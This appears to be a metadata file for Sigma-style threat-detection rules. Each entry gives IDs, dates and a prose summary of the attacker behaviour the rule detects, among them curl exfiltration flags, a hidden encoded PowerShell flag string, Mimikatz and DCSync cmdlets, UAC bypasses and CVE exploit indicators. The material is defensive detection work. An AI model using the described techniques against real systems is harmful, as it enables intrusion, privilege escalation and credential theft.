002bdb95-0cf1-46a6-9e08-d38c128a6127:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6b7a7634afd4edd54cc9ccbb35345c9d
  Ruleset: core
  Summary: This rule detects when the Windows Script Host executables, cscript.exe
    or wscript.exe, write script files with extensions such as .jse, .vbe, .js, .vba,
    or .vbs to directories commonly associated with user or program data, like 'C:\Users\'
    or 'C:\ProgramData'. The occurrence of such activity is often associated with
    malicious behavior, specifically when used as a dropper for executing scripts,
    indicating a potential threat of malware execution or other unauthorized actions
    within the system.
  Updated-Date: '2024_09_03'
0033cf83-fb87-446d-9cac-43d63ad4d5a9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f7dff9bd35e4be5db92f82baf460f4de
  Ruleset: emerging-threats
  Summary: This rule detects a specific command line usage of "regsvr32" where the
    "calc" keyword appears alongside the "/s" flag. This pattern is commonly associated
    with the Qakbot malware, which uses it as part of its malicious activities. The
    detection focuses on identifying these command line parameters in process creation
    logs on Windows systems.
  Updated-Date: '2024_09_03'
0055ad1f-be85-4798-83cf-a6da17c993b3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fe0933b8b3de0365dde292766afd14f6
  Ruleset: core
  Summary: This rule detects configuration changes made to an application's URI. It
    focuses on identifying URIs associated with several security concerns, such as
    domain names that no longer exist (dangling URIs), the lack of HTTPS usage, wildcard
    endings in domain names, URIs not unique to the application, or those pointing
    to domains outside of the organization's control. Such changes could indicate
    potential security risks and require investigation to ensure they are legitimate
    and authorized.
  Updated-Date: '2024_09_03'
0058b9e5-bcd7-40d4-9205-95ca5a16d7b2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d4917fd30302a6ffa3ce0d09d9050d65
  Ruleset: core
  Summary: This rule detects the pattern of a UAC (User Account Control) Bypass using
    Windows Media Player's osksupport.dll, a technique employed by the UACMe tool
    (UACMe 32). The detection focuses on process creation events where either 'osk.exe'
    from Windows Media Player is executed with elevated privileges, or 'cmd.exe' is
    launched with 'mmc.exe' and 'eventvwr.msc' as parent command line components,
    also with elevated privileges. This activity is associated with Windows operating
    systems and targets privilege escalation and defense evasion tactics.
  Updated-Date: '2024_09_03'
0066d244-c277-4c3e-88ec-9e7b777cc8bc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 15446ed3d15197c2dfad15d71f3a7677
  Ruleset: emerging-threats
  Summary: This rule detects a potentially unique pattern associated with the RomCom
    malware exploiting CVE-2023-36884. It monitors proxy logs for HTTP GET requests
    containing the string '/MSHTML_C7/' in the URI, with a query parameter matching
    the pattern of an IP address. This detection aims to identify command-and-control
    activities indicative of an emerging threat.
  Updated-Date: '2024_09_03'
00a8e92a-776b-425f-80f2-82d8f8fab2e5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5ccfd38d9c6fa67c2b37fc3983f4106b
  Ruleset: emerging-threats
  Summary: This rule detects the creation or activation of new user accounts in the
    Okta system, specifically targeting usernames akin to "svc_network_backup," which
    may indicate compromise associated with the Okta Support System breach of 2023.
    Users should enhance this rule by excluding known and legitimate usernames within
    their environment.
  Updated-Date: '2024_09_03'
00b90cc1-17ec-402c-96ad-3a8117d7a582:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5ff4ce73adb621d5aaa20847280aa3d
  Ruleset: sigmahq
  Summary: This rule detects a suspicious curl process initiating a file upload in
    a Linux environment. It identifies instances where the curl command is executed
    with specific arguments such as '--form', '--upload-file', '--data', and variations
    of '--data-*', which suggest possible exfiltration of data. The rule applies filters
    to exclude local host connections to avoid false positives, often caused by legitimate
    scripts created by developers and administrators.
  Updated-Date: '2024_09_04'
00ba9da1-b510-4f6b-b258-8d338836180f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1efbeea45ce62034bf0f9028e58c5f94
  Ruleset: sigmahq
  Summary: This rule detects the extraction of password-protected ZIP archives on
    a Windows system by monitoring for specific security event IDs. It identifies
    instances where a file matching the pattern 'Microsoft_Windows_Shell_ZipFolder:filename'
    is accessed, filtering out occurrences related to temporary internet files.
  Updated-Date: '2024_09_04'
00d49ed5-4491-4271-a8db-650a4ef6f8c1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19d2145a96f0715d5ff155d4013754a5
  Ruleset: core
  Summary: This rule detects suspicious activities related to downloading files from
    Microsoft domains that are typically used for storing email attachments or OneNote
    documents. It monitors for the usage of specific command-line tools and commands
    such as `curl.exe`, `wget.exe`, `Invoke-WebRequest`, and others, looking for download
    attempts from URLs associated with Outlook and OneNote services. The detection
    aims to identify potential command-and-control activity or initial access vectors
    by scrutinizing download actions from these domains.
  Updated-Date: '2024_09_03'
00eee2a5-fdb0-4746-a21d-e43fbdea5681:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b58756fe372e14932d141ad79e584b6
  Ruleset: sigmahq
  Summary: This rule detects the creation of the `doas.conf` file on a Linux host
    platform. This file is associated with Doas, a command that allows a permitted
    user to execute a command as another user, often used for privilege escalation.
    The detection focuses on any event where the target filename ends with `/etc/doas.conf`.
  Updated-Date: '2024_09_04'
0152550d-3a26-4efd-9f0e-54a0b28ae2f3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 478f29a7fbf057f889266ded22acfec5
  Ruleset: sigmahq
  Summary: This rule detects the execution of PowerShell code via the sqlps.exe utility.
    The sqlps.exe utility is included with Microsoft SQL Server and can be used to
    bypass protection mechanisms that rely on analyzing script block logs. By utilizing
    sqlps.exe, attackers can execute PowerShell commands without generating typical
    script block log entries, evading detection. The rule identifies instances where
    sqlps.exe is executed, specifically checking for processes that spawn this utility
    outside of legitimate contexts, such as those initiated by the SQL Server Agent
    (sqlagent.exe).
  Updated-Date: '2024_09_04'
01aeb693-138d-49d2-9403-c4f52d7d3d62:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cada26f271d495a2231fbbc561b563f3
  Ruleset: core
  Summary: This rule detects the use of the netsh command to configure the firewall
    to allow connections on port 3389, which is the default port for Remote Desktop
    Protocol (RDP). This technique has been observed in usage by the Sarwent malware,
    which facilitates unauthorized remote desktop access. Specifically, the rule identifies
    netsh.exe processes that issue commands to add TCP firewall rules for port 3389,
    either through the "portopening" or "allow" parameters. This activity could indicate
    an attempt to bypass security measures for remote access.
  Updated-Date: '2024_09_03'
01c42d3c-242d-4655-85b2-34f1739632f7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9033e9c02270568fe28fa021f62942e6
  Ruleset: sigmahq
  Summary: This rule detects the usage of Dsacls.exe to grant over permissive permissions.
    Dsacls.exe is a command-line tool used to manage access control lists (ACLs) for
    Active Directory objects. The detections focus on processes where Dsacls.exe is
    executed and specific command-line flags are used that indicate granting permissions
    like 'GR' (Generic Read), 'GE' (Generic Execute), 'GW' (Generic Write), 'GA' (Generic
    All), 'WP' (Write Property), or 'WD' (Delete). This activity can be indicative
    of attempts to evade defenses by improperly escalating user privileges. False
    positives may occur in cases where legitimate administrators grant extensive permissions
    intentionally.
  Updated-Date: '2024_09_04'
01d2e2a1-5f09-44f7-9fc1-24faa7479b6d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d0b1139dc5d155fc0285bac87c64ddf6
  Ruleset: sigmahq
  Summary: This rule detects instances where the svchost.exe process is created by
    an uncommon parent process. By monitoring the process creation logs on Windows
    systems, it specifically looks for svchost.exe instances but excludes common parent
    processes like Mrt.exe, MsMpEng.exe, ngen.exe, rpcnet.exe, services.exe, and TiWorker.exe,
    as well as cases where the parent process is null or empty. This helps identify
    potentially suspicious activity that could indicate defense evasion or execution
    masquerading tactics.
  Updated-Date: '2024_09_04'
02030f2f-6199-49ec-b258-ea71b07e03dc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d07db91513fcc3892a3a2f52adcb41f
  Ruleset: sigmahq
  Summary: This rule detects the execution of specific PowerShell commandlets associated
    with well-known exploitation frameworks used for malicious activities. These commandlets
    encompass a variety of functions, including but not limited to system manipulation,
    reconnaissance, and credential theft. Examples include `Invoke-Mimikatz` for extracting
    credentials, `Invoke-DCSync` for mimicking domain controllers to extract account
    details, and `Invoke-Nightmare` related to exploiting print spooler vulnerabilities.
    These commandlets are indicative of post-exploitation activities and adversary
    techniques aimed at persistence, lateral movement, and data exfiltration. Detection
    of these commandlets helps to identify and respond to potential security breaches
    involving malicious PowerShell use.
  Updated-Date: '2024_09_04'
021310d9-30a6-480a-84b7-eaa69aeb92bb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8ddd66c961b222e6362b17d307fdc974
  Ruleset: core
  Summary: This rule detects the first instance of a newly observed remote named pipe
    and excludes known named pipes that are commonly accessed remotely. This can help
    identify potential lateral movement and remote execution activity using named
    pipes, which may indicate malicious behavior in a network. The monitoring focuses
    on detecting access patterns specifically through the Zeek network monitoring
    tool and looks for paths matching the string `\\*\IPC$`, while filtering out well-known
    named pipes such as `samr`, `lsarpc`, and others listed to reduce false positives.
  Updated-Date: '2024_09_03'
022eaba8-f0bf-4dd9-9217-4604b0bb3bb0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d9f42e1cf84373b0bedcdf1e6b468f8
  Ruleset: core
  Summary: This rule detects the execution of PowerShell with a specific sequence
    of flags that indicate the use of the Wmiexec script. The flags include '-NoP
    -NoL -sta -NonI -W Hidden -Exec Bypass -Enc', which are characteristic of Wmiexec's
    default command for performing tasks such as defense evasion and lateral movement
    within a Windows environment.
  Updated-Date: '2024_09_03'
023394c4-29d5-46ab-92b8-6a534c6f447b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea9615a4fccbbbf776d678fb0af35ed4
  Ruleset: core
  Summary: This rule detects suspicious sub-processes initiated by the Hangul Word
    Processor (Hanword), specifically focusing on the execution of a process named
    "gbb.exe" as a sub-process of "Hwp.exe." The presence of such sub-processes may
    indicate the exploitation of vulnerabilities within Hanword files, potentially
    leading to malicious activities.
  Updated-Date: '2024_09_03'
023c654f-8f16-44d9-bb2b-00ff36a62af9:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 55970411a81c2abb715e483502f82c7e
  Ruleset: core
  Summary: This rule detects changes to the registry value "PythonFunctionWarnings"
    which disables security warnings when Python functions are executed in Microsoft
    Excel. This feature could be exploited by threat actors to run malicious code
    through Python in spreadsheets.
  Updated-Date: '2024_09_03'
0248a7bc-8a9a-4cd8-a57e-3ae8e073a073:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c808668390a4b15c305f30ddcbc84195
  Ruleset: sigmahq
  Summary: This rule detects the mounting of an ISO image on a Windows endpoint by
    identifying specific file access events. It monitors for event IDs indicating
    that an ISO file has been mounted, focusing on activity associated with the device
    representing a CD-ROM drive. This detection is significant as ISO images are often
    used in malicious spam campaigns to deliver payloads like Lokibot and NanoCore,
    which are types of malware used for stealing information and remote control, respectively.
    The rule aims to differentiate between potentially harmful ISO images and benign
    ones typically used during software installations.
  Updated-Date: '2024_09_04'
0250638a-2b28-4541-86fc-ea4c558fa0c6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 524240f5d777c8c4c7504762e3184b7e
  Ruleset: sigmahq
  Summary: This rule detects suspicious child processes spawned from web browsers
    on macOS. It identifies potential exploitation by monitoring processes such as
    bash, curl, python, and others that are initiated by browser applications like
    Safari, Google Chrome, Firefox, and Microsoft Edge. The rule includes multiple
    filters to reduce false positives from legitimate sources, such as browser updates,
    installation scripts, the Microsoft AutoUpdate utility, and other system recovery
    scripts. The primary goal is to identify unusual or potentially harmful activity
    arising from web browser processes, which could indicate malicious exploitation
    attempts.
  Updated-Date: '2024_09_04'
0255a820-e564-4e40-af2b-6ac61160335c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3fedc1ded939e851c6799b17e13bcf5b
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new trust relationship to a domain
    in a Windows environment by monitoring for Event ID 4706. Trusts between domains
    are rarely added, so any new trust creation should be verified to ensure it is
    legitimate. This activity could indicate an attempt to establish persistence within
    a network.
  Updated-Date: '2024_09_04'
025bd229-fd1f-4fdb-97ab-20006e1a5368:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eea0abb548e5ba21b54aa6469008d470
  Ruleset: core
  Summary: This rule detects the download of a suspicious file type from URLs that
    use direct IP addresses. It identifies particular file types, such as PowerShell
    scripts (.ps1), batch files (.bat), executables (.exe), and others, which are
    commonly associated with potential malicious activities. The focus is on files
    that have a "Zone" identifier in their filenames, indicating that they have been
    downloaded and may pose a security risk.
  Updated-Date: '2024_09_03'
025c9fe7-db72-49f9-af0d-31341dd7dd57:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e5cbbba6ca2c088b8457ab490e0dd9b
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions to Azure Firewall rule collections,
    which include Application, NAT, and Network rules. Actions such as writing to
    or deleting these rule collections are identified by specific operation names
    in the activity logs. Changes to these collections could be part of standard administrative
    tasks or indicative of unauthorized modifications that could impact network security
    and operations. False positives may occur if legitimate administrative changes
    are not properly documented, so it is important to verify the authenticity of
    the actions and the identities of the users making these changes.
  Updated-Date: '2024_09_04'
02773bed-83bf-469f-b7ff-e676e7d78bab:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d923d0eac7d56770db9f5c542d29ff47
  Ruleset: core
  Summary: This rule detects the creation of file names associated with the BloodHound
    collection tool, SharpHound. BloodHound is utilized for analyzing Active Directory
    structures for security auditing and attack path analysis. Specifically, the rule
    identifies extensions such as 'BloodHound.zip', '_computers.json', '_containers.json',
    '_domains.json', '_gpos.json', '_groups.json', '_ous.json', and '_users.json'
    to monitor potential data collection activities undertaken by SharpHound. Any
    exceptions for legitimate software, particularly instances involving Microsoft's
    svchost.exe and specified Windows applications, are filtered out to reduce noise
    and false positives.
  Updated-Date: '2024_09_03'
028c7842-4243-41cd-be6f-12f3cf1a26c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6275f9412506166c213873a77ad019af
  Ruleset: core
  Summary: This rule detects WRITE_DAC access to a domain object in a Windows environment
    by monitoring for EventID 4662 in the security logs. WRITE_DAC access refers to
    the modification of discretionary access control lists (DACLs), which specify
    the permissions of users and groups to a particular object. This can be a critical
    security event as unauthorized changes to DACLs on domain objects can lead to
    privilege escalation and other forms of security breaches. The rule specifically
    looks for access to directory service objects with certain ObjectType identifiers,
    indicating potential tampering with Active Directory configurations.
  Updated-Date: '2024_09_03'
02b18447-ea83-4b1b-8805-714a8a34546a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5afcc1e8aecf41913a0de0cd8bfb5615
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "OfflineScannerShell.exe" from a
    non-standard directory on Windows systems. The "OfflineScannerShell.exe" binary,
    associated with Windows Defender, is susceptible to DLL sideloading attacks, wherein
    any DLL named "mpclient.dll" in the current working directory can be loaded by
    this executable. This rule aims to identify potentially malicious attempts to
    exploit this vulnerability for defense evasion.
  Updated-Date: '2024_09_04'
02b64f1b-3f33-4e67-aede-ef3b0a5a8fcf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9053c07521b7bda3f25d281526225aaf
  Ruleset: sigmahq
  Summary: This rule detects the usage of COM objects that can be exploited to download
    files through PowerShell by their CLSID. It monitors for specific command-line
    patterns associated with these objects, particularly the use of the PowerShell
    function `[Type]::GetTypeFromCLSID(` and various CLSID identifiers known for their
    association with potentially malicious download activity. It aims to identify
    instances where PowerShell scripts utilize these COM objects, which can indicate
    command-and-control activities or the download of additional malicious components.
  Updated-Date: '2024_09_04'
02cbc035-b390-49fe-a9ff-3bb402c826db:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 059ca1b972db77bfcfde17692f71e3f2
  Ruleset: emerging-threats
  Summary: 'This rule detects a specific sequence of command-line arguments associated
    with the installation process of the SNAKE malware. According to a CISA report,
    the `jpsetup.exe` installer for SNAKE malware requires two arguments to be passed
    via the command line: the first argument is a wide character string hashed with
    SHA-256 twice, typically 64 characters in length, and the second argument includes
    an AES initialization vector (IV) consisting of the first 16 bytes, typically
    at least 16 characters long. The rule identifies these characteristics to pinpoint
    potential SNAKE malware installations.'
  Updated-Date: '2024_09_03'
02d1d718-dd13-41af-989d-ea85c7fab93f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9919a6b7f932bcd0e9804cd2e38599a2
  Ruleset: sigmahq
  Summary: This rule detects rare instances of remote thread creation by processes
    identified as uncommon source images. The processes listed include typical utilities
    and applications such as 'bash.exe', 'cscript.exe', 'excel.exe', 'msbuild.exe',
    'ping.exe', and 'python.exe'. These processes, when creating remote threads, may
    indicate attempts at privilege escalation or defense evasion, aligning with tactics
    used in attack techniques for in-memory offensive tools. Logging this activity
    allows for monitoring and baseline creation to differentiate between benign and
    suspicious behavior.
  Updated-Date: '2024_09_04'
02e0b2ea-a597-428e-b04a-af6a1a403e5c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78904d424c3c982edd3d8c79a8c016fa
  Ruleset: emerging-threats
  Summary: This rule detects an exploitation attempt of the vulnerability identified
    as CVE-2019-1388, where the User Account Control (UAC) consent dialog is used
    to start an Internet Explorer process with SYSTEM-level privileges. The detection
    looks for specific process creation patterns, including the UAC consent executable
    (`consent.exe`) as the parent process and Internet Explorer (`iexplore.exe`) as
    the invoked process, along with command line parameters containing 'http'. It
    also checks for execution integrity levels and user roles indicative of SYSTEM
    privileges.
  Updated-Date: '2024_09_03'
02ee49e2-e294-4d0f-9278-f5b3212fc588:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ee3565b588e9f441c727ce53488c6803
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new Windows RUN key element that directs
    to an executable located in a suspicious folder. Commonly targeted folders include
    the Recycle Bin, various Temp directories, and user-specific directories like
    Desktop and Public. The rule aims to identify potential persistence mechanisms
    employed by malware, specifically when executables are placed in uncommon or irregular
    directories. It filters out legitimate software updates from the detection to
    reduce false positives. Potential false positives can include software that utilizes
    unconventional directories for updates.
  Updated-Date: '2024_09_04'
02f7c9c1-1ae8-4c6a-8add-04693807f92f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 09095aaff154fc8e473178722cb25b17
  Ruleset: sigmahq
  Summary: This rule detects potential token impersonation and theft on Windows systems
    by monitoring for specific activities such as the usage of "DuplicateToken(Ex)"
    and "ImpersonateLoggedOnUser" functions with the "LOGON32_LOGON_NEW_CREDENTIALS"
    flag. These activities are indicative of access token manipulation techniques
    commonly employed for defense evasion and privilege escalation. The detection
    focuses on security event logs with EventID 4624, LogonType 9, LogonProcessName
    as 'Advapi', and the AuthenticationPackageName as 'Negotiate', combined with an
    ImpersonationLevel of '%%1833'. While legitimate uses such as anti-virus operations
    are possible, these patterns typically indicate malicious behavior.
  Updated-Date: '2024_09_04'
0322d9f2-289a-47c2-b5e1-b63c90901a3e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96c82a105e2d959c3eaa6fa183336b0e
  Ruleset: sigmahq
  Summary: This rule detects the creation, patching, updating, or deletion of potentially
    malicious RoleBindings and ClusterRoleBindings within Google Cloud Kubernetes
    environments. Actions such as these on RoleBindings involve handling access control
    and permissions, which, if compromised, could enable unauthorized access or control.
    The detection is based on specific method names logged by Google Cloud's audit
    service that pertain to these activities. While administrative actions by authorized
    users may trigger this rule, any modifications by unfamiliar users warrant further
    investigation to ensure they are not malicious.
  Updated-Date: '2024_09_04'
0326c3c8-7803-4a0f-8c5c-368f747f7c3e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5fe2a2903a959ab08fd43e61270e0fa1
  Ruleset: core
  Summary: This rule detects the execution of a file named "execve_hijack," which
    is utilized by the Triple Cross rootkit to elevate privileges on a Linux system.
    The rule identifies when the command line contains "execve_hijack" in conjunction
    with the execution of the 'sudo' command. This behavior is indicative of a potential
    privilege escalation attempt via the Triple Cross eBPF Rootkit. The intended detection
    environment involves monitoring process creation events on Linux systems.
  Updated-Date: '2024_09_03'
032f5fb3-d959-41a5-9263-4173c802dc2b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7de42232559967e0dabd5feeda061610
  Ruleset: emerging-threats
  Summary: This rule detects process executions characteristic of Formbook malware,
    which injects code into specific files within the System32 directory. The malware
    executes a command to delete the dropper file from the AppData Temp folder. By
    excluding parent processes with specific command line parameters, false positives
    are minimized.
  Updated-Date: '2024_09_03'
03409c93-a7c7-49ba-9a4c-a00badf2a153:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0f3ca4e95b81da231e2d25fa5fdc0f22
  Ruleset: sigmahq
  Summary: This rule detects the execution of "TroubleshootingPack" cmdlets that may
    be leveraged to exploit CVE-2022-30190 or involve an action similar to the "msdt"
    living-off-the-land binary (LOLBin). Specific script block text elements such
    as 'Invoke-TroubleshootingPack,' paths to diagnostics tools, and certain parameters
    are monitored to identify this activity. Potential false positives include legitimate
    use of the "TroubleshootingPack" cmdlet for troubleshooting activities.
  Updated-Date: '2024_09_04'
03552375-cc2c-4883-bbe4-7958d5a980be:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2bc8e5fbb3b6288108c5a13f5fa1480f
  Ruleset: core
  Summary: This rule detects the use of the SILENTTRINITY stager, a tool used for
    command-and-control purposes, by identifying specific metadata within portable
    executable (PE) files. SILENTTRINITY is an open-source, remote access tool (RAT)
    that allows an attacker to execute commands on a compromised system. The rule
    focuses on identifying instances where the PE file description contains the term
    'st2stager', which is indicative of the SILENTTRINITY stager being executed on
    a Windows system. The likelihood of false positives is considered low.
  Updated-Date: '2024_09_03'
0372e1f9-0fd2-40f7-be1b-a7b2b848fa7b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b46b786d645e97a8aad851445d01baab
  Ruleset: sigmahq
  Summary: This rule detects registry modifications that disable the Privacy Settings
    Experience on Windows systems. The focus is on changes to a specific registry
    key located at '\SOFTWARE\Policies\Microsoft\Windows\OOBE\DisablePrivacyExperience'
    with a particular DWORD value of '0x00000000'. Such alterations can be associated
    with defense evasion tactics.
  Updated-Date: '2024_09_04'
037dcd71-33a8-4392-bb01-293c94663e5a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6795a3f37a4c0d8f6ee4975b52e5926d
  Ruleset: sigmahq
  Summary: This rule detects the usage of Gpg4win, a software that implements the
    OpenPGP standard and provides encryption and decryption functionalities, to decrypt
    files. It monitors process creation events on Windows systems specifically looking
    for the invocation of commands using 'gpg.exe' or 'gpg2.exe' with the `-d` flag
    (indicating decryption) and the presence of a passphrase. This activity can potentially
    indicate the decryption of files, which may be associated with malicious activities
    such as those performed by malware like Batloader or Zloader to access encrypted
    data.
  Updated-Date: '2024_09_04'
039a7469-0296-4450-84c0-f6966b16dc6d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f0d0c1e42dd161c571323cc4f2868b1f
  Ruleset: core
  Summary: This rule detects when a Privileged Identity Management (PIM) elevation
    is either approved or denied within Microsoft Azure, outside of normal operations.
    Elevated privileges granted through PIM should be closely monitored as they pertain
    to privilege escalation. This activity will be shown in Azure audit logs, and
    any deviations from usual administrative actions should be promptly investigated
    to ensure there are no unauthorized access attempts.
  Updated-Date: '2024_09_03'
03cc0c25-389f-4bf8-b48d-11878079f1ca:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e46341450793a7dc896f20729fbfb728
  Ruleset: core
  Summary: This rule detects the spawning of suspicious processes from an "mshta.exe"
    process, which is often indicative of the execution of a malicious HTML Application
    (HTA) script. Specifically, it monitors for child processes such as 'cmd.exe',
    'powershell.exe', 'pwsh.exe', 'wscript.exe', 'cscript.exe', 'sh.exe', 'bash.exe',
    'reg.exe', 'regsvr32.exe', and 'bitsadmin.exe' that start from "mshta.exe". Malicious
    actors commonly use this technique to evade defenses and execute harmful scripts
    or commands. Although there may be legitimate reasons for these processes to be
    spawned by "mshta.exe", such instances should be scrutinized closely to distinguish
    between normal activity and potential threats.
  Updated-Date: '2024_09_03'
03d83090-8cba-44a0-b02f-0b756a050306:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: adf19902058c8ad585fcba7bb68bde3c
  Ruleset: core
  Summary: This rule detects the execution of potentially malicious WinAPI function
    calls within PowerShell scripts. It looks for specific instances in the script
    block text that invoke WinAPI functions such as 'VirtualAlloc', 'OpenProcess',
    'WriteProcessMemory', 'CreateRemoteThread', 'OpenProcessToken', 'LookupPrivilegeValue',
    'AdjustTokenPrivileges', 'DuplicateTokenEx', 'CloseHandle', 'ReadProcessMemory',
    and 'VirtualFree'. These function calls are commonly associated with various forms
    of process injection, token manipulation, and memory manipulation, activities
    often observed in the behavior of advanced adversaries and malware. PowerShell
    Script Block Logging must be enabled to make use of this detection method.
  Updated-Date: '2024_09_03'
03e2746e-2b31-42f1-ab7a-eb39365b2422:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 36575d1c75c9a3c82279b27d117026d4
  Ruleset: emerging-threats
  Summary: This rule detects activity associated with APT31, also known as Judgement
    Panda, targeting systems as detailed in the Crowdstrike 2019 Global Threat Report.
    Specific behaviors monitored include the use of 'ldifde' command-line utility
    with certain parameters, which might indicate suspicious directory export operations.
    Additionally, it identifies potential lateral movement tactics by monitoring for
    the use of file copy commands to administrative shares and the execution of tools
    such as 'procdump64.exe,' 'netsess.exe,' and '7za.exe' from specific directories.
    The rule aims to alert on these activities, which are often linked to credential
    access and other malicious operations in the network.
  Updated-Date: '2024_09_03'
04017cd5-621e-4ec4-a762-1f042fe3d3e5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91c77d1b65208ea4e485e1ac8f6b550f
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation of CVE-2023-46214, a vulnerability
    in Splunk Enterprise that allows for remote code execution (RCE) through insecure
    XML parsing. It identifies malicious activity by monitoring web server logs for
    specific conditions, including HTTP POST requests with certain query parameters
    indicative of the exploit. The rule focuses on queries that contain indicators
    like 'NO_BINARY_CHECK=1' and 'input.path', and ends with '.xsl', combined with
    successful response status codes 200 or 302. This monitoring aims to catch potentially
    harmful behavior targeting the identified vulnerability in Splunk Enterprise.
  Updated-Date: '2024_09_03'
0403d67d-6227-4ea8-8145-4e72db7da120:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25560b6c65198fc10543317c3031c985
  Ruleset: sigmahq
  Summary: This rule detects the use of a Microsoft signed script, UtilityFunctions.ps1,
    executing a managed DLL with PowerShell. This activity is indicative of a defense
    evasion technique and involves the use of the script in conjunction with the 'RegSnapin'
    command.
  Updated-Date: '2024_09_04'
043c1609-0e32-4462-a6f2-5a0c2da3fafe:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c31441e7dc5a86028bff2a6cb5b93694
  Ruleset: emerging-threats
  Summary: This rule detects a potential exploitation attempt of CVE-2023-25717, a
    vulnerability that allows for Remote Code Execution via an unauthenticated HTTP
    GET Request in Ruckus Wireless Admin systems. The rule identifies suspicious GET
    requests involving the login endpoint and specific query parameters indicative
    of an exploit attempt. The presence of encoded characters associated with command
    execution is also monitored to flag potential threats accurately. While some false
    positives may arise from legitimate activities such as vulnerability scanners
    or unusual password characters, additional indicators can be considered to refine
    the detection.
  Updated-Date: '2024_09_03'
043c4b8b-3a54-4780-9682-081cb6b8185c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3b9c92da955f717e9b19fb869420727f
  Ruleset: core
  Summary: This rule detects a suspicious IIS module registration, which can indicate
    the presence of an IIS backdoor as detailed in a Microsoft threat report. The
    rule monitors for specific command-line activities associated with the process
    `w3wp.exe`, such as the use of 'appcmd.exe add module', the involvement of 'system.enterpriseservices.internal.publish'
    via 'powershell.exe', and commands using 'gacutil /I'. These activities are unusual
    for normal administrative actions and can signify malicious attempts to persistently
    backdoor an IIS server.
  Updated-Date: '2024_09_03'
0442defa-b4a2-41c9-ae2c-ea7042fc4701:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
